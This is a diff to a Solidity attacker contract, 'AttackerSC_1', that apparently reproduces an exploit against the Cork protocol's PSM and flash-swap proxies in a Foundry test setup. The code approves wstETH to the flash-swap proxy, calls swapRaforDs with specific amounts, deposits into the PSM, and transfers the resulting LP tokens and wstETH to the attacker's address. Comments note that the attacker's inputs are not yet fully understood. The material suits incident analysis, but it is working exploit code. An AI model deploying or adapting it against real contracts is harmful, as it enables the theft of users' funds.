@@ -2,6 +2,7 @@
 pragma solidity ^0.8.17;
 
 import "./Interfaces.sol";
+import "forge-std/console.sol";
 
 // Attacker's Smart Contract 1
 contract AttackerSC_1 {
@@ -10,6 +11,7 @@ contract AttackerSC_1 {
     IERC20 public weETH5CT;
     ICorkHook corkHook;
     IPSMProxy psmProxy;
+    IPSMProxy flashSwapProxy;
     IExchangeRateProvider exchangeRateProvider;
 
     address attacker_EOA;
@@ -23,6 +25,7 @@ contract AttackerSC_1 {
         address _weETH5CT,
         address _corkHook,
         address _psmProxy,
+        address _flashSwapProxy,
         address _rateProvider
     ) {
         mtk = IMyToken(_mtk);
@@ -30,6 +33,7 @@ contract AttackerSC_1 {
         weETH5CT = IERC20(_weETH5CT);
         corkHook = ICorkHook(_corkHook);
         psmProxy = IPSMProxy(_psmProxy);
+        flashSwapProxy = IPSMProxy(_flashSwapProxy);
         exchangeRateProvider = IExchangeRateProvider(_rateProvider);
         attacker_EOA = msg.sender;
     }
@@ -53,7 +57,7 @@ contract AttackerSC_1 {
         IERC20(wstETH).transferFrom(attacker_EOA, address(this), 10e18);
 
         // Step 1.6. Approve wstETH to Cork's Proxy and call swapRaforDs
-        wstETH.approve(address(psmProxy), type(uint256).max);
+        wstETH.approve(address(flashSwapProxy), type(uint256).max);
 
         // Standard default values
         IPSMProxy.BuyAprroxParams memory buyParams;
@@ -65,13 +69,17 @@ contract AttackerSC_1 {
 
         // Sending an empty guess, incurrs in greater gas expenses. The attacker made some guesses.
         IPSMProxy.OffchainGuess memory offchainGuess;
+        // offchainGuess.initialBorrowAmount = 2_035_043_806_577_874_200;
+        // offchainGuess.afterSoldBorrowAmount = 2_554_953_564_824_393_000;
 
         // TODO: We need to identify how the attacker calculated the amount
-        psmProxy.swapRaforDs(PAIR_ID_FOR_RATE, 1, 3_407_593_947_121_416, 0, buyParams, offchainGuess);
+        flashSwapProxy.swapRaforDs(PAIR_ID_FOR_RATE, 1, 3_407_593_947_121_416, 0, buyParams, offchainGuess);
 
         // Step 1.7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
-        wstETH.approve(address(psmProxy), 0);
+        wstETH.approve(address(flashSwapProxy), 0);
         wstETH.approve(address(psmProxy), type(uint256).max);
+
+        console.log("wstETH balance: %s", wstETH.balanceOf(address(this)));
 
         // Step 1.8. Deposit into proxy's PSM with depositPSM
         psmProxy.depositPSM(PAIR_ID_FOR_RATE, 10e6);
@@ -95,20 +103,5 @@ contract AttackerSC_1 {
 
         IERC20(lpTokenAddress).transfer(attacker_EOA, IERC20(lpTokenAddress).balanceOf(address(this)));
         wstETH.transfer(attacker_EOA, wstETH.balanceOf(address(this)));
-    }
-
-    function approveToken(address tokenAddress, address spender, uint256 amount) external {
-        require(msg.sender == attacker_EOA, "not attacker_EOA");
-        IERC20(tokenAddress).approve(spender, amount);
-    }
-
-    function transferToken(address tokenAddress, address to, uint256 amount) external {
-        require(msg.sender == attacker_EOA, "not attacker_EOA");
-        IERC20(tokenAddress).transfer(to, amount);
-    }
-
-    function transferFromToken(address tokenAddress, address from, address to, uint256 amount) external {
-        require(msg.sender == attacker_EOA, "not attacker_EOA");
-        IERC20(tokenAddress).transferFrom(from, to, amount);
     }
 }
